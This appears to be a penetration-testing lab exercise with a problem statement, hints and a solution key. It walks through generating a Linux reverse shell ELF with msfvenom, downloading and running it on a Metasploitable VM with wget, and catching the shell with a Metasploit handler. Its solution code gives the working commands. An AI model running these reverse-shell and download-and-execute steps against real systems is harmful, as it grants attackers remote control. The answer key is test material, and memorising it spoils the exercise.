title: Generate and Use a Standalone Payload
description: Create a Linux reverse shell binary and catch it with a handler.
problemStatement:
# Objective
Generate a standalone Linux reverse shell payload using msfvenom, transfer it to Metasploitable (simulate a real attack), and catch the connection with a Metasploit handler.

## Steps
1.  Use `msfvenom` to generate a Linux x64 reverse shell binary:
    ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=[Kali_IP] LPORT=4444 -f elf -o shell.elf
    ```
2.  Set up a handler in Metasploit:
    ```
    use exploit/multi/handler
    set PAYLOAD linux/x64/shell_reverse_tcp
    set LHOST [Kali_IP]
    set LPORT 4444
    run -j
    ```
3.  **Simulate Transfer**: Since you have access to Metasploitable (from Task 1 or credentials), copy the file via SCP or host a Python HTTP server on Kali and `wget` from Metasploitable.
4.  On Metasploitable, make the file executable (`chmod +x shell.elf`) and run it (`./shell.elf`).
5.  Your handler should catch the connection.

## Deliverable
Screenshot of the handler receiving a connection and the shell prompt.
hints: Use `python3 -m http.server 8000` on Kali to host the file.
expectedOutput: A reverse shell session opened in Metasploit.
solutionCode:
# Kali - Generate payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f elf -o shell.elf

# Kali - Start HTTP server
python3 -m http.server 8000

# Metasploitable - Download and run
wget http://192.168.56.102:8000/shell.elf
chmod +x shell.elf
./shell.elf

# Kali - Handler (in msfconsole)
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 192.168.56.102
set LPORT 4444
exploit -j
